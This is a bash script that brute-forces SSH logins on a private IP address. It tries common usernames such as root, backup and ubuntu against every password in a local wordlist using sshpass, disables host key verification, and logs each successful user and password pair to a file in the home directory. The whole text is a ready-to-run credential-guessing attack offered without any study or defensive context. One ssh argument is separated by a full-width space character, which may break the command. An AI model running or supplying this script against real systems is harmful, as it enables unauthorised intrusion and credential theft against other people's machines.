#!/bin/bash

IP="172.16.10.13"
USERS="
root
guest
backup
ubuntu
centos
"
FILE="./passwords.txt"
LOG="${HOME}/ssh_log.txt"

for u in ${USERS}; do
    while read -r pass; do
        if sshpass -p "${pass}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null　-n "${u}@${IP}" exit 2>/dev/null; then
            echo "${u}@${pass}" >> "${LOG}"
        fi
    done < "${FILE}"
done
